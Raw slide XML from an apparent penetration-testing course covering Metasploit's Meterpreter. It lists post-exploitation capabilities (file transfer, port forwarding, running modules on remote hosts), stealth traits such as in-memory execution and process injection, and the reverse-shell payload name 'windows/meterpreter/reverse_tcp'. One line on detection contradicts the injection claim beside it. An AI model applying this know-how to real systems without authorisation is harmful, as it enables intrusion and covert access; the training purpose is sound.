          <p:cNvPr id="624" name="Google Shape;624;p82"/>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Meterpreter</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="625" name="Google Shape;625;p82"/>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626" name="Google Shape;626;p82"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="70200" y="588350"/>
            <a:ext cx="8813400" cy="400200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="365750" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="95000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>With Metasploit, we can use Meterpreter to:</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="627" name="Google Shape;627;p82"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="953325" y="19310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Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="628" name="Google Shape;628;p82"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="953325" y="25734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Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="629" name="Google Shape;629;p82"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="953325" y="32159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Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="630" name="Google Shape;630;p82"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="953325" y="12892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Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="631" name="Google Shape;631;p82"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="802850" y="12598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Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="632" name="Google Shape;632;p82"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="802850" y="19016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Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="633" name="Google Shape;633;p82"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="802850" y="25440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Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="634" name="Google Shape;634;p82"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="802850" y="3179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Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="635" name="Google Shape;635;p82"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1261850" y="1259713"/>
            <a:ext cx="7073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200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Upload and download files to and from a target.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="636" name="Google Shape;636;p82"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1261850" y="1912825"/>
            <a:ext cx="7073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200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Set up port forwarding through the target.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="637" name="Google Shape;637;p82"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1261850" y="2555163"/>
            <a:ext cx="7073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200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Switch between Meterpreter shells.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="638" name="Google Shape;638;p82"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1261850" y="3186525"/>
            <a:ext cx="7073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200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Run Metasploit modules on remote hosts.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>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2" name="Shape 642"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="643" name="Google Shape;643;p83"/>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Meterpreter</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="644" name="Google Shape;644;p83"/>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645" name="Google Shape;645;p83"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="70200" y="588350"/>
            <a:ext cx="7635600" cy="400200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="365750" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="95000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Meterpreter is slightly more difficult to detect and leaves minimal traces on victim machines or the network.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="646" name="Google Shape;646;p83"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="665375" y="3937800"/>
            <a:ext cx="7301700" cy="7554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Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="647" name="Google Shape;647;p83"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="399658" y="3919968"/>
            <a:ext cx="548700" cy="548700"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FCB91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rgbClr val="082D49"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:srgbClr val="082D49"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="648" name="Google Shape;648;p83"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="665375" y="2412075"/>
            <a:ext cx="7301700" cy="1387500"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 8633"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Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="649" name="Google Shape;649;p83"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="399658" y="2621168"/>
            <a:ext cx="548700" cy="548700"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FCB91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rgbClr val="082D49"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:srgbClr val="082D49"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="650" name="Google Shape;650;p83"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1075825" y="2453025"/>
            <a:ext cx="6553800" cy="926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700">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>It does not start any new processes on the victim. Instead, it “injects” itself into a program that’s already running. Therefore, users see that Meterpreter has started by looking at running processes. (This is not the case with an SSH session, which launches a new shell process.)</a:t>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="651" name="Google Shape;651;p83"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1075825" y="4078950"/>
            <a:ext cx="6515700" cy="229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700">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Meterpreter encrypts all communication to and from the victim machine.</a:t>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="652" name="Google Shape;652;p83"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="665375" y="1540750"/>
            <a:ext cx="7301700" cy="66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Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="653" name="Google Shape;653;p83"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="399658" y="1522918"/>
            <a:ext cx="548700" cy="548700"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FCB91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rgbClr val="082D49"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:srgbClr val="082D49"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="654" name="Google Shape;654;p83"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1075825" y="1682375"/>
            <a:ext cx="6553800" cy="229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700">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>It runs entirely in memory, meaning it does not create files on the target.</a:t>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk2"/>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58" name="Shape 658"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="659" name="Google Shape;659;p84"/>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Meterpreter Basics</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="660" name="Google Shape;660;p84"/>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661" name="Google Shape;661;p84"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="70200" y="588350"/>
            <a:ext cx="8571900" cy="824400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="365750" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="95000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>The easiest way to open a Meterpreter shell is to select an exploit and set </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>a Meterpreter payload.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="95000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>A common payload is:</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="662" name="Google Shape;662;p84"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="371450" y="1747800"/>
            <a:ext cx="8401200" cy="1189200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 8510" name="adj"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="lt2"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="ctr" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="45700">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="3600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t>windows/meterpreter/reverse_tcp</a:t>
            </a:r>
            <a:endParaRPr sz="3600">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="663" name="Google Shape;663;p84"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1322450" y="3534825"/>
            <a:ext cx="7450200" cy="621300"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 16667" name="adj"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="ctr" bIns="91425" lIns="18287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lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Note:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> You can have multiple Meterpreter sessions open on multiple machines.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="664" name="Google Shape;664;p84"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="67501" y="3230584"/>
            <a:ext cx="1189274" cy="118927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8" name="Shape 668"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="669" name="Google Shape;669;p85"/>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latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
              </a:rPr>
              <a:t>Meterpreter Command Basics</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Roboto Medium"/>
              <a:ea typeface="Roboto Medium"/>
              <a:cs typeface="Roboto Medium"/>
              <a:sym typeface="Roboto Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="670" name="Google Shape;670;p85"/>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671" name="Google Shape;671;p85"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="70200" y="588350"/>
            <a:ext cx="8571900" cy="824400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="365750" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="95000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>The following commands are used to connect to a Meterpreter session:</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="672" name="Google Shape;672;p85"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="426338" y="1568908"/>
          <a:ext cx="3000000" cy="3000000"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr>
                <a:noFill/>
                <a:tableStyleId>{6612969B-C513-441B-A60A-CB1CB7D8F428}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="3732100"/>
                <a:gridCol w="4711625"/>
              </a:tblGrid>
              <a:tr h="757000">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
                        <a:lnSpc>
